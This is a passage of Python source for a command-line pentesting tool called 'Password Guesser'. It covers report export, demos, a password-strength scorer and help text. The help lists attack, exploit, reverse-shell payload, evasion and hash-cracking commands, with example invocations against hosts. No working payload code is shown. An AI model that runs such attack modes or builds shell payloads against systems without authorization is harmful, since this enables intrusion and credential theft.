    """Generate HTML flamegraph."""
    _generate_text_flamegraph(stats, output_file)


def cmd_demo(args):
    """Run built-in demonstrations."""
    topic = args.topic

    if not topic or topic == "all":
        print("\n[+] Available demos:\n")
        demos = ["password", "scan", "attack", "chart", "pipeline", "export"]
        for d in demos:
            print(f"  - {d}")
        print("\nUsage: demo <topic>")
        return

    print(f"\n[+] Running demo: {topic}\n")

    if topic == "password":
        print("# Password Analysis Demo\n")
        print("## Evaluating common passwords:\n")
        passwords = ["password", "123456", "P@ssw0rd!", "MyDog+2024", "xK#9mP$vL2"]
        for pwd in passwords:
            score = _quick_score(pwd)
            bar = "#" * (score // 10) + "-" * (10 - score // 10)
            print(f"  {pwd:<20} [{bar}] {score}/100")

    elif topic == "chart":
        print("# Chart Demo\n")
        print("Generating sample charts...\n")
        demos = [
            ("chart -o demo_bar.png --type bar --title 'Findings by Severity'", "bar chart"),
            ("chart -o demo_pie.png --type pie --title 'Severity Distribution'", "pie chart"),
            ("chart -o demo_line.svg --type line --title 'Trend Over Time'", "line chart"),
        ]
        for cmd, desc in demos:
            print(f"  $ {cmd}")
            print(f"  -> Generates {desc}\n")

    elif topic == "pipeline":
        print("# Pipeline Demo\n")
        print("Chain commands together:\n")
        print("  $ pipeline 'scan --target 192.168.1.1' 'evaluate' 'report -o report.html'")
        print("  -> Executes scan -> evaluate -> report in sequence\n")
        print("  $ scan 192.168.1.1 %>% evaluate %>% report -o report.html")
        print("  -> Same pipeline using %>% operator (in REPL)\n")

    elif topic == "export":
        print("# Export Demo\n")
        print("Export reports in multiple formats:\n")
        print("  $ export -i session.json -o report.pdf --include-charts")
        print("  $ export -i session.json -o slides.pptx")
        print("  $ export -i session.json -o data.xlsx")

    elif topic == "scan":
        print("# Scan Demo\n")
        print("Network scanning examples:\n")
        print("  $ scan --target 192.168.1.1 --type quick")
        print("  $ scan --target 192.168.1.0/24 --type full --detect_os")
        print("  $ scan --target 10.0.0.1 --stealth --ports 22,80,443")

    elif topic == "attack":
        print("# Attack Demo\n")
        print("Attack mode examples:\n")
        print("  $ attack --target admin@192.168.1.100 --mode team")
        print("  $ attack --target test@smtp.example.com --stealth")
        print("  $ attack --target 192.168.1.100 --mode auto --report")


def _quick_score(password: str) -> int:
    """Quick password strength score (0-100)."""
    score = 0
    if len(password) >= 8:
        score += 20
    if len(password) >= 12:
        score += 10
    if any(c.islower() for c in password):
        score += 10
    if any(c.isupper() for c in password):
        score += 10
    if any(c.isdigit() for c in password):
        score += 10
    if any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
        score += 20
    if len(set(password)) / max(len(password), 1) > 0.7:
        score += 20
    return min(100, score)


def cmd_export(args):
    """Export data and reports to various formats."""
    input_file = args.input
    output_file = args.output
    fmt = args.format
    title = args.title or "Export Report"
    include_charts = args.include_charts
    include_graph = args.include_graph
    embed_images = args.embed_images

    # Auto-detect format from extension
    if not fmt:
        ext = os.path.splitext(output_file)[1].lower().lstrip(".")
        fmt_map = {"png": "png", "svg": "svg", "pdf": "pdf",
                   "html": "html", "docx": "docx", "xlsx": "xlsx", "pptx": "pptx"}
        fmt = fmt_map.get(ext)
        if not fmt:
            print(f"[!] Cannot determine format from extension '.{ext}'")
            print("    Use --format to specify: png, svg, pdf, html, docx, xlsx, pptx")
            return

    print(f"\n[+] Exporting...")
    print(f"  Input: {input_file}")
    print(f"  Output: {output_file}")
    print(f"  Format: {fmt}")

    if not os.path.exists(input_file):
        print(f"  [ERROR] Input file not found: {input_file}")
        return

    # Load input data
    try:
        data = _load_export_data(input_file)
    except Exception as e:
        print(f"  [ERROR] Failed to load input: {e}")
        return

    # Generate charts if requested
    chart_images = []
    if include_charts:
        chart_images = _generate_export_charts(data, title, embed_images)

    # Export based on format
    try:
        if fmt == "png" or fmt == "svg" or fmt == "pdf":
            _export_image(data, output_file, fmt, title, chart_images, width=args.width if hasattr(args, 'width') else 1200)

        elif fmt == "html":
            _export_html_report(data, output_file, title, chart_images, include_graph, embed_images)

        elif fmt == "pdf":
            _export_pdf_report(data, output_file, title, chart_images)

        elif fmt == "docx":
            _export_docx(data, output_file, title, chart_images)

        elif fmt == "xlsx":
            _export_xlsx(data, output_file, title)

        elif fmt == "pptx":
            _export_pptx(data, output_file, title, chart_images)

        print(f"  [OK] Exported to {output_file}")

    except Exception as e:
        print(f"  [ERROR] Export failed: {e}")


def _load_export_data(filepath):
    """Load data for export."""
    ext = os.path.splitext(filepath)[1].lower()

    if ext == ".json":
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    elif ext == ".csv":
        import csv
        with open(filepath, "r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            return {"type": "table", "rows": list(reader)}
    elif ext in (".yaml", ".yml"):
        import yaml
        with open(filepath, "r", encoding="utf-8") as f:
            return yaml.safe_load(f)
    else:
        with open(filepath, "r", encoding="utf-8") as f:
            return {"content": f.read()}


def _generate_export_charts(data, title, embed_images):
    """Generate chart images for embedding in reports."""
    charts = []

    try:
        import matplotlib
        matplotlib.use("Agg")
        import matplotlib.pyplot as plt
        import numpy as np

        _setup_fonts(plt)

        # Generate vulnerability severity chart if data looks like pentest results
        findings = data.get("findings", data.get("vulnerabilities", []))
        if findings:
            # Severity distribution
            severities = {}
            for f in findings:
                sev = f.get("severity", "info") if isinstance(f, dict) else "info"
                severities[sev] = severities.get(sev, 0) + 1

            if severities:
                fig, ax = plt.subplots(figsize=(8, 5))
                colors = {"critical": "#e74c3c", "high": "#e67e22", "medium": "#f1c40f",
                          "low": "#2ecc71", "info": "#3498db"}
                bar_colors = [colors.get(s, "#95a5a6") for s in severities.keys()]
                ax.bar(severities.keys(), severities.values(), color=bar_colors)
                ax.set_title("Vulnerability Severity Distribution", fontsize=14, fontweight="bold")
                ax.set_ylabel("Count")
                ax.grid(axis="y", alpha=0.3)

                buf = _chart_to_base64(fig) if embed_images else None
                charts.append({
                    "title": "Vulnerability Severity Distribution",
                    "type": "bar",
                    "data": severities,
                    "base64": buf,
                })
                plt.close(fig)

        # Generate category chart
        categories = data.get("categories", data.get("technologies", {}))
        if categories and isinstance(categories, dict):
            fig, ax = plt.subplots(figsize=(8, 5))
            ax.pie(categories.values(), labels=categories.keys(), autopct="%1.1f%%")
            ax.set_title("Category Distribution", fontsize=14, fontweight="bold")

            buf = _chart_to_base64(fig) if embed_images else None
            charts.append({
                "title": "Category Distribution",
                "type": "pie",
                "data": categories,
                "base64": buf,
            })
            plt.close(fig)

    except ImportError:
        pass

    return charts


def _chart_to_base64(fig):
    """Convert matplotlib figure to base64 string."""
    import base64
    from io import BytesIO

    buf = BytesIO()
    fig.savefig(buf, format="png", dpi=100, bbox_inches="tight",
                facecolor="white", edgecolor="none")
    buf.seek(0)
    return base64.b64encode(buf.read()).decode("utf-8")


def _export_image(data, output_file, fmt, title, charts, width=1200):
    """Export as static image (PNG/SVG/PDF)."""
    import matplotlib
    matplotlib.use("Agg")
    import matplotlib.pyplot as plt

    _setup_fonts(plt)

    n_charts = max(len(charts), 1)
    fig, axes = plt.subplots(n_charts, 1, figsize=(width / 100, 5 * n_charts), dpi=100)
    if n_charts == 1:
        axes = [axes]

    if charts:
        for i, chart in enumerate(charts):
            ax = axes[i]
            chart_data = chart.get("data", {})
            if chart.get("type") == "bar":
                ax.bar(chart_data.keys(), chart_data.values(), color="steelblue")
            elif chart.get("type") == "pie":
                ax.pie(chart_data.values(), labels=chart_data.keys(), autopct="%1.1f%%")
            ax.set_title(chart.get("title", ""), fontsize=14, fontweight="bold")
    else:
        # Render data as text table
        ax = axes[0]
        ax.axis("off")
        if isinstance(data, dict):
            text = "\n".join(f"{k}: {v}" for k, v in data.items())
        else:
            text = str(data)
        ax.text(0.1, 0.9, text, transform=ax.transAxes, fontsize=10,
                verticalalignment="top", fontfamily="monospace")
        ax.set_title(title, fontsize=14, fontweight="bold")

    plt.tight_layout()
    plt.savefig(output_file, dpi=100, bbox_inches="tight",
                facecolor="white", edgecolor="none")
    plt.close(fig)


def _export_html_report(data, output_file, title, charts, include_graph, embed_images):
    """Export as HTML report with embedded charts."""
    html_parts = [
        "<!DOCTYPE html>",
        "<html lang='en'><head>",
        "<meta charset='UTF-8'>",
        f"<title>{title}</title>",
        "<style>",
        "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; "
        "max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }",
        "h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }",
        "h2 { color: #34495e; margin-top: 30px; }",
        "table { width: 100%; border-collapse: collapse; margin: 15px 0; background: white; }",
        "th { background: #2c3e50; color: white; padding: 12px; text-align: left; }",
        "td { padding: 10px 12px; border-bottom: 1px solid #ecf0f1; }",
        "tr:nth-child(even) { background: #f9f9f9; }",
        ".chart-container { background: white; padding: 15px; margin: 15px 0; "
        "border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }",
        ".chart-container img { max-width: 100%; height: auto; }",
        ".severity-critical { color: #e74c3c; font-weight: bold; }",
        ".severity-high { color: #e67e22; font-weight: bold; }",
        ".severity-medium { color: #f1c40f; font-weight: bold; }",
        ".severity-low { color: #2ecc71; font-weight: bold; }",
        ".summary { background: white; padding: 20px; border-radius: 8px; margin: 15px 0; "
        "box-shadow: 0 2px 4px rgba(0,0,0,0.1); }",
        ".footer { text-align: center; color: #7f8c8d; margin-top: 30px; padding: 20px; }",
        "</style>",
        "</head><body>",
        f"<h1>{title}</h1>",
        f"<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
    ]

    # Summary section
    html_parts.append('<div class="summary"><h2>Summary</h2>')
    if isinstance(data, dict):
        findings = data.get("findings", data.get("vulnerabilities", []))
        html_parts.append(f"<p>Total findings: {len(findings)}</p>")

        if findings:
            sev_counts = {}
            for f in findings:
                sev = f.get("severity", "info") if isinstance(f, dict) else "info"
                sev_counts[sev] = sev_counts.get(sev, 0) + 1
            html_parts.append("<p>Severity breakdown: ")
            for sev, count in sev_counts.items():
                html_parts.append(
                    f'<span class="severity-{sev}">{sev.upper()}: {count}</span> | '
                )
            html_parts.append("</p>")
    html_parts.append('</div>')

    # Charts
    if charts:
        html_parts.append('<h2>Charts</h2>')
        for chart in charts:
            html_parts.append('<div class="chart-container">')
            html_parts.append(f'<h3>{chart.get("title", "Chart")}</h3>')
            if chart.get("base64"):
                html_parts.append(
                    f'<img src="data:image/png;base64,{chart["base64"]}" '
                    f'alt="{chart.get("title", "Chart")}">'
                )
            else:
                # Render as HTML table
                chart_data = chart.get("data", {})
                html_parts.append('<table>')
                for k, v in chart_data.items():
                    html_parts.append(f'<tr><td>{k}</td><td>{v}</td></tr>')
                html_parts.append('</table>')
            html_parts.append('</div>')

    # Findings table
    findings = data.get("findings", data.get("vulnerabilities", []))
    if findings:
        html_parts.append('<h2>Findings</h2>')
        html_parts.append('<table><tr><th>#</th><th>Title</th><th>Severity</th>'
                          '<th>Description</th></tr>')
        for i, f in enumerate(findings, 1):
            if isinstance(f, dict):
                sev = f.get("severity", "info")
                html_parts.append(
                    f'<tr><td>{i}</td><td>{f.get("title", "N/A")}</td>'
                    f'<td class="severity-{sev}">{sev.upper()}</td>'
                    f'<td>{f.get("description", "")[:200]}</td></tr>'
                )
        html_parts.append('</table>')

    # Attack graph
    if include_graph:
        html_parts.append('<h2>Attack Graph</h2>')
        try:
            from attack_graph.visualization import AttackGraphVisualizer
            viz = AttackGraphVisualizer()
            graph_html = viz.to_html()
            # Extract the body content from the graph HTML
            if "<body>" in graph_html:
                body = graph_html.split("<body>")[1].split("</body>")[0]
                html_parts.append(body)
            else:
                html_parts.append(graph_html)
        except Exception:
            html_parts.append('<p>Attack graph not available</p>')

    # Raw data
    html_parts.append('<h2>Raw Data</h2>')
    html_parts.append(f'<pre>{json.dumps(data, indent=2, default=str)[:5000]}</pre>')

    html_parts.append('<div class="footer">')
    html_parts.append(f'<p>Password Guesser Report - {datetime.now().strftime("%Y-%m-%d")}</p>')
    html_parts.append('</div>')
    html_parts.append('</body></html>')

    with open(output_file, "w", encoding="utf-8") as f:
        f.write("\n".join(html_parts))


def _export_pdf_report(data, output_file, title, charts):
    """Export as PDF report."""
    # First generate HTML, then try to convert
    html_file = output_file.replace(".pdf", "_temp.html")

    try:
        _export_html_report(data, html_file, title, charts, False, True)

        # Try weasyprint
        try:
            from weasyprint import HTML
            HTML(filename=html_file).write_pdf(output_file)
            os.unlink(html_file)
            return
        except ImportError:
            pass

        # Try pdfkit
        try:
            import pdfkit
            pdfkit.from_file(html_file, output_file)
            os.unlink(html_file)
            return
        except ImportError:
            pass

        # Fallback: keep HTML and warn
        print(f"  [WARN] PDF libraries not installed (weasyprint/pdfkit)")
        print(f"  HTML report saved to: {html_file}")
        print(f"  Install: pip install weasyprint")

    except Exception as e:
        print(f"  [ERROR] PDF export failed: {e}")
        if os.path.exists(html_file):
            print(f"  HTML report available: {html_file}")


def _export_docx(data, output_file, title, charts):
    """Export as DOCX (Word document)."""
    try:
        from docx import Document
        from docx.shared import Inches, Pt
        from docx.enum.text import WD_ALIGN_PARAGRAPH
    except ImportError:
        print("  [ERROR] python-docx not installed. Install with: pip install python-docx")
        return

    doc = Document()

    # Title
    heading = doc.add_heading(title, level=0)
    heading.alignment = WD_ALIGN_PARAGRAPH.CENTER

    doc.add_paragraph(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    # Summary
    doc.add_heading("Summary", level=1)
    if isinstance(data, dict):
        findings = data.get("findings", data.get("vulnerabilities", []))
        doc.add_paragraph(f"Total findings: {len(findings)}")

    # Charts as images
    if charts:
        doc.add_heading("Charts", level=1)
        for chart in charts:
            if chart.get("base64"):
                import base64
                from io import BytesIO
                img_data = base64.b64decode(chart["base64"])
                buf = BytesIO(img_data)
                try:
                    doc.add_picture(buf, width=Inches(6))
                except Exception:
                    doc.add_paragraph(f"[Chart: {chart.get('title', 'Chart')}]")
                doc.add_paragraph()

    # Findings table
    findings = data.get("findings", data.get("vulnerabilities", []))
    if findings:
        doc.add_heading("Findings", level=1)
        table = doc.add_table(rows=1, cols=4)
        table.style = "Light Grid Accent 1"
        hdr = table.rows[0].cells
        hdr[0].text = "#"
        hdr[1].text = "Title"
        hdr[2].text = "Severity"
        hdr[3].text = "Description"

        for i, f in enumerate(findings, 1):
            if isinstance(f, dict):
                row = table.add_row().cells
                row[0].text = str(i)
                row[1].text = f.get("title", "N/A")
                row[2].text = f.get("severity", "info").upper()
                row[3].text = f.get("description", "")[:200]

    # Raw data
    doc.add_heading("Raw Data", level=1)
    doc.add_paragraph(json.dumps(data, indent=2, default=str)[:3000])

    doc.save(output_file)


def _export_xlsx(data, output_file, title):
    """Export as Excel spreadsheet."""
    try:
        from openpyxl import Workbook
        from openpyxl.styles import Font, PatternFill, Alignment
    except ImportError:
        print("  [ERROR] openpyxl not installed. Install with: pip install openpyxl")
        return

    wb = Workbook()

    # Summary sheet
    ws = wb.active
    ws.title = "Summary"
    ws["A1"] = title
    ws["A1"].font = Font(bold=True, size=16)
    ws["A2"] = f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    # Findings sheet
    findings = data.get("findings", data.get("vulnerabilities", []))
    if findings:
        ws2 = wb.create_sheet("Findings")
        headers = ["#", "Title", "Severity", "Description"]
        for col, header in enumerate(headers, 1):
            cell = ws2.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="2C3E50", end_color="2C3E50", fill_type="solid")

        for i, f in enumerate(findings, 2):
            if isinstance(f, dict):
                ws2.cell(row=i, column=1, value=i - 1)
                ws2.cell(row=i, column=2, value=f.get("title", "N/A"))
                ws2.cell(row=i, column=3, value=f.get("severity", "info"))
                ws2.cell(row=i, column=4, value=f.get("description", ""))

        # Adjust column widths
        ws2.column_dimensions["A"].width = 5
        ws2.column_dimensions["B"].width = 30
        ws2.column_dimensions["C"].width = 15
        ws2.column_dimensions["D"].width = 50

    # Raw data sheet
    if isinstance(data, dict):
        ws3 = wb.create_sheet("Raw Data")
        for i, (k, v) in enumerate(data.items(), 1):
            ws3.cell(row=i, column=1, value=k)
            ws3.cell(row=i, column=2, value=str(v)[:32000])
            ws3.cell(row=i, column=1).font = Font(bold=True)
        ws3.column_dimensions["A"].width = 25
        ws3.column_dimensions["B"].width = 60

    wb.save(output_file)


def _export_pptx(data, output_file, title, charts):
    """Export as PowerPoint presentation."""
    try:
        from pptx import Presentation
        from pptx.util import Inches, Pt
    except ImportError:
        print("  [ERROR] python-pptx not installed. Install with: pip install python-pptx")
        return

    prs = Presentation()
    prs.slide_width = Inches(13.333)
    prs.slide_height = Inches(7.5)

    # Title slide
    slide = prs.slides.add_slide(prs.slide_layouts[0])
    slide.shapes.title.text = title
    slide.placeholders[1].text = f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    # Summary slide
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "Summary"
    if isinstance(data, dict):
        findings = data.get("findings", data.get("vulnerabilities", []))
        body = slide.placeholders[1]
        tf = body.text_frame
        tf.text = f"Total findings: {len(findings)}"

        if findings:
            sev_counts = {}
            for f in findings:
                sev = f.get("severity", "info") if isinstance(f, dict) else "info"
                sev_counts[sev] = sev_counts.get(sev, 0) + 1
            for sev, count in sev_counts.items():
                p = tf.add_paragraph()
                p.text = f"  {sev.upper()}: {count}"

    # Chart slides
    for chart in charts:
        slide = prs.slides.add_slide(prs.slide_layouts[1])
        slide.shapes.title.text = chart.get("title", "Chart")

        if chart.get("base64"):
            import base64
            from io import BytesIO
            img_data = base64.b64decode(chart["base64"])
            buf = BytesIO(img_data)
            try:
                slide.shapes.add_picture(buf, Inches(1.5), Inches(1.5), Inches(10))
            except Exception:
                pass

    # Findings slide
    findings = data.get("findings", data.get("vulnerabilities", []))
    if findings:
        slide = prs.slides.add_slide(prs.slide_layouts[1])
        slide.shapes.title.text = "Key Findings"
        body = slide.placeholders[1]
        tf = body.text_frame
        for f in findings[:10]:
            if isinstance(f, dict):
                p = tf.add_paragraph()
                p.text = f"[{f.get('severity', 'info').upper()}] {f.get('title', 'N/A')}"

    prs.save(output_file)


def cmd_report(args):
    """Generate pentest report."""
    session_file = args.session
    output_file = args.output
    fmt = args.format
    include_charts = getattr(args, "include_charts", False)
    include_graph = getattr(args, "include_graph", False)
    chart_type = getattr(args, "chart_type", "bar")
    template = getattr(args, "template", "default")

    if not os.path.exists(session_file):
        print(f"[!] Session file not found: {session_file}")
        return

    print(f"\n[+] Generating report...")
    print(f"  Session: {session_file}")
    print(f"  Output: {output_file}")
    print(f"  Format: {fmt}")

    # Load session data
    try:
        with open(session_file, "r", encoding="utf-8") as f:
            session_data = json.load(f)
    except Exception as e:
        print(f"  [ERROR] Failed to load session: {e}")
        return

    # Generate charts if requested
    chart_images = []
    if include_charts:
        chart_images = _generate_export_charts(session_data, "Pentest Report", embed_images=True)
        print(f"  Generated {len(chart_images)} charts")

    if fmt in ("json",):
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(session_data, f, indent=2, default=str)

    elif fmt in ("markdown", "md"):
        report_md = _generate_markdown_report(session_data, chart_images, template)
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(report_md)

    elif fmt == "html":
        _export_html_report(session_data, output_file, "Penetration Test Report",
                           chart_images, include_graph, True)

    elif fmt == "pdf":
        _export_pdf_report(session_data, output_file, "Penetration Test Report", chart_images)

    elif fmt == "pptx":
        _export_pptx(session_data, output_file, "Penetration Test Report", chart_images)

    print(f"  [OK] Report saved to {output_file}")


def _generate_markdown_report(data, charts, template="default"):
    """Generate markdown report."""
    lines = [
        "# Penetration Test Report",
        f"\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"**Template:** {template}",
        "\n---\n",
    ]

    if template == "executive":
        lines.append("## Executive Summary\n")
        findings = data.get("findings", [])
        lines.append(f"This report covers **{len(findings)}** security findings.\n")

        if findings:
            critical = sum(1 for f in findings if isinstance(f, dict) and f.get("severity") == "critical")
            high = sum(1 for f in findings if isinstance(f, dict) and f.get("severity") == "high")
            lines.append(f"- Critical: {critical}")
            lines.append(f"- High: {high}")
            lines.append("")

    # Summary
    lines.append("## Summary\n")
    for key, value in data.items():
        if key not in ("findings", "vulnerabilities", "raw"):
            lines.append(f"- **{key}:** {value}")
    lines.append("")

    # Charts
    if charts:
        lines.append("## Charts\n")
        lines.append("*Charts are available in HTML/PDF export format*\n")

    # Findings
    findings = data.get("findings", data.get("vulnerabilities", []))
    if findings:
        lines.append("## Findings\n")
        lines.append("| # | Title | Severity | Description |")
        lines.append("|---|-------|----------|-------------|")
        for i, f in enumerate(findings, 1):
            if isinstance(f, dict):
                lines.append(
                    f"| {i} | {f.get('title', 'N/A')} | "
                    f"{f.get('severity', 'info').upper()} | "
                    f"{f.get('description', '')[:100]} |"
                )
        lines.append("")

    lines.append("---\n")
    lines.append("*Generated by Password Guesser CLI*\n")

    return "\n".join(lines)


def cmd_help(args):
    """Show help information for commands."""
    command = args.help_command
    verbose = args.verbose
    show_examples = args.examples

    if not command:
        # Show general help with all commands grouped by category
        print("\n" + "=" * 70)
        print("  Password Guesser CLI - Command Reference")
        print("=" * 70)

        print("""
  Core Commands:
    train            Train the MAMBA password model
    generate         Generate password candidates
    evaluate         Evaluate password strength
    wordlist         Generate custom wordlists
    benchmark        Run performance benchmarks
    version          Show version info

  Interactive & Shell:
    interactive      Launch enhanced REPL (tab-completion, history, variables)
    script           Execute / validate / record / replay script files

  Attack & Recon:
    scan             Network scanning and reconnaissance
    attack           Launch attack modes (auto/team/interactive/stealth)
    exploit          Search and run exploits
    payload          Generate payloads (reverse/bind shells)
    crawl            Web crawler for reconnaissance
    fuzz             Fuzzing (web/param/header/path)
    dns              DNS enumeration
    osint            OSINT intelligence gathering

  Password & Crypto:
    hash             Calculate hash values (md5/sha1/sha256/sha512)
    hashcat          Hash cracking with hashcat
    encode           Encode/decode text (base64/hex/url/rot13/caesar)
    crypt            Cryptographic tools (encrypt/decrypt/keygen/sslcheck)

  Pentest & Tools:
    pentest          Run full penetration test
    report           Generate pentest report
    tools            Penetration testing tools management
    session          Active session management
    listener         Listener management
    reverse-shell    Reverse shell payload generator
    graph            Attack graph visualization
    evasion          Evasion technique management
    scope            Authorization scope management
    lessons          Lessons learned database
    sandbox          Sandbox execution for tools

  Network & Services:
    network          Network utilities (ping/traceroute/resolve/portcheck)
    api              API testing utilities (get/post/fuzz/auth)
    wifi             WiFi security analysis
    db               Database security tools
    log              Log analysis tools
    stego            Steganography tools (hide/extract/analyze)

  AI & Knowledge:
    knowledge        Knowledge base operations
    analyze          AI-powered vulnerability analysis
    llm              Direct LLM interaction
    rl               Reinforcement learning operations
    adversarial      Red/blue team simulation
    pcfg             PCFG password generation
    augment          Password data augmentation
    rules            Password rules operations

  Data & I/O:
    data             Data import/export/convert/merge/validate
    output           Output formatting (table/json/csv/markdown/html/yaml)

  Environment:
    config           Configuration management
    env              Environment and workspace management
    pkg              Package and tool management
    status           Show system status
    debug            Debug and diagnostics tools
    profile          Performance profiling

  Help:
    help [command]   Show help for a specific command
    doc [topic]      Detailed documentation for topics

  Usage:
    password-guesser <command> --help     Show command options
    password-guesser help <command>       Show detailed help
    password-guesser help <command> -e    Show with examples
    password-guesser help <command> -v    Verbose help
""")
        return

    # Help for a specific command
    # Map command names to detailed help text
    help_db = {
        "train": {
            "usage": "password-guesser train --data <file> [options]",
            "desc": "Train the MAMBA password model on password dataset.",
            "options": {
                "--config, -c": "Configuration file (YAML)",
                "--data, -d": "Password data file (required)",
                "--epochs, -e": "Number of training epochs (default: 100)",
                "--batch_size": "Batch size (default: 64)",
                "--lr": "Learning rate (default: 0.001)",
                "--output": "Output directory for checkpoints",
                "--amp": "Enable automatic mixed precision (GPU)",
                "--warmup_steps": "Warmup steps (default: 1000)",
                "--grad_accum": "Gradient accumulation steps",
                "--scheduler": "LR scheduler: cosine | onecycle",
                "--gradient_checkpointing": "Enable gradient checkpointing",
                "--early_stopping": "Early stopping patience",
                "--resume": "Resume from checkpoint path",
            },
            "examples": [
                "password-guesser train -d passwords.txt -e 100 --amp",
                "password-guesser train -c config.yaml -d data.txt --early_stopping 10",
                "password-guesser train -d data.txt --resume checkpoints/epoch_50.pt",
            ]
        },
        "generate": {
            "usage": "password-guesser generate --checkpoint <file> --target <info> [options]",
            "desc": "Generate password candidates using trained model.",
            "options": {
                "--checkpoint": "Model checkpoint file",
                "--target": "Target information for targeted generation",
                "--method": "Generation method: beam | sampling | greedy",
                "--count": "Number of passwords to generate",
                "--temperature": "Sampling temperature (0.1-2.0)",
                "--config": "Configuration file",
            },
            "examples": [
                "password-guesser generate -c model.pt --target 'AcmeCorp2024'",
                "password-guesser generate -c model.pt --method beam --count 50",
                "password-guesser generate -c model.pt --temperature 0.8 --count 100",
            ]
        },
        "scan": {
            "usage": "password-guesser scan --target <host> [options]",
            "desc": "Network scanning and reconnaissance.",
            "options": {
                "--target": "Target IP, hostname, or CIDR range",
                "--type": "Scan type: quick | full | stealth | vuln",
                "--ports": "Port range (e.g. 1-1000, 80,443,8080)",
                "--fast": "Fast scan mode",
                "--aggressive": "Aggressive scan",
                "--stealth": "Stealth scan mode",
                "--detect_os": "Enable OS detection",
                "--service_version": "Service version detection",
                "--script": "Run NSE script",
                "--format": "Output format: json | xml | nmap | csv",
            },
            "examples": [
                "password-guesser scan --target 192.168.1.1 --type quick",
                "password-guesser scan --target 192.168.1.0/24 --type full --detect_os",
                "password-guesser scan --target 10.0.0.1 --stealth --ports 22,80,443",
            ]
        },
        "attack": {
            "usage": "password-guesser attack --target <target> [options]",
            "desc": "Launch attack modes against target.",
            "options": {
                "--target": "Target (user@host or service URL)",
                "--mode": "Attack mode: auto | team | interactive",
                "--goal": "Goal: credential | bruteforce | service",
                "--stealth": "Enable stealth mode",
                "--aggressive": "Aggressive mode",
                "--timeout": "Timeout in seconds",
                "--report": "Generate attack report",
                "--no_validation": "Skip target validation",
            },
            "examples": [
                "password-guesser attack --target admin@192.168.1.100 --mode team",
                "password-guesser attack --target test@smtp.example.com --stealth",
                "password-guesser attack --target 192.168.1.100 --mode auto --report",
            ]
        },
        "evaluate": {
            "usage": "password-guesser evaluate --password <pwd> [options]",
            "desc": "Evaluate password strength and provide analysis.",
            "options": {
                "--password": "Password to evaluate",
                "--detailed": "Show detailed analysis",
                "--compare": "Compare with another password",
            },
            "examples": [
                "password-guesser evaluate --password 'P@ssw0rd!' --detailed",
                "password-guesser evaluate --password 'admin123'",
            ]
        },
        "wordlist": {
            "usage": "password-guesser wordlist --output <file> [options]",
            "desc": "Generate custom wordlists based on patterns and rules.",
            "options": {
                "--output, -o": "Output file",
                "--pattern": "Naming pattern (e.g. '@@@2024')",
                "--count": "Number of passwords to generate",
                "--min_length": "Minimum password length",
                "--max_length": "Maximum password length",
                "--charset": "Character set: lower | upper | digits | all",
                "--rules_file": "Apply transformation rules",
                "--leet": "Enable leet-speak substitution",
                "--append_numbers": "Append number sequences",
                "--append_specials": "Append special characters",
            },
            "examples": [
                "password-guesser wordlist -o dict.txt --pattern 'Company2024' --count 5000",
                "password-guesser wordlist -o wl.txt --charset lower --min_length 8",
                "password-guesser wordlist -o wl.txt --leet --append_numbers",
            ]
        },
        "crawl": {
            "usage": "password-guesser crawl <url> [options]",
            "desc": "Web crawler for reconnaissance - discovers pages, forms, tech stack.",
            "options": {
                "--depth": "Maximum crawl depth (default: 3)",
                "--max_urls": "Maximum URLs to crawl",
                "--vuln_scan": "Enable vulnerability scanning",
                "--tech_detect": "Enable technology detection",
                "--output": "Save results to file",
            },
            "examples": [
                "password-guesser crawl https://example.com --depth 3",
                "password-guesser crawl https://target.com --vuln_scan --tech_detect",
            ]
        },
        "hash": {
            "usage": "password-guesser hash --text <text> [options]",
            "desc": "Calculate hash values using various algorithms.",
            "options": {
                "--text": "Text to hash",
                "--file": "Hash contents of file",
                "--algorithm": "Algorithm: md5 | sha1 | sha256 | sha512 | all",
                "--compare": "Compare with known hash",
            },
            "examples": [
                "password-guesser hash --text 'hello world'",
                "password-guesser hash --file data.txt --algorithm sha256",
                "password-guesser hash --text 'secret' --compare 5ebe2294ecd0e0f08eab7690d2a6ee69",
            ]
        },
        "encode": {
            "usage": "password-guesser encode --text <text> --method <method>",
            "desc": "Encode or decode text using various methods.",
            "options": {
                "--text": "Text to encode/decode",
                "--method": "Method: base64 | hex | url | rot13 | caesar | morse | binary",
            },
            "examples": [
                "password-guesser encode --text 'secret' --method base64",
                "password-guesser decode --text 'c2VjcmV0' --method base64",
            ]
        },
        "debug": {
            "usage": "password-guesser debug --action <action>",
            "desc": "Debug and diagnostics tools.",
            "options": {
                "--action": "Action: info | check | deps | config | trace | memory | threads",
                "--module": "Module to debug/trace",
                "--verbose": "Verbose output",
            },
            "examples": [
                "password-guesser debug --action info",
                "password-guesser debug --action check",
                "password-guesser debug --action deps",
            ]
        },
        "profile": {
            "usage": "password-guesser profile --action <action> [options]",
            "desc": "Performance profiling and benchmarking.",
            "options": {
                "--action": "Action: benchmark | compare | memory | hotspot | report",
                "--module": "Module to profile",
                "--iterations": "Number of iterations (default: 10)",
                "--output": "Save report to file",
                "--format": "Output format: text | json | csv",
            },
            "examples": [
                "password-guesser profile --action benchmark",
                "password-guesser profile --action report --output report.json",
            ]
        },
        "env": {
            "usage": "password-guesser env --action <action>",
            "desc": "Environment and workspace management.",
            "options": {
                "--action": "Action: show | init | reset | backup | restore | export | clean",
                "--name": "Environment name",
                "--output": "Output file for backup/export",
            },
            "examples": [
                "password-guesser env --action show",
                "password-guesser env --action init",
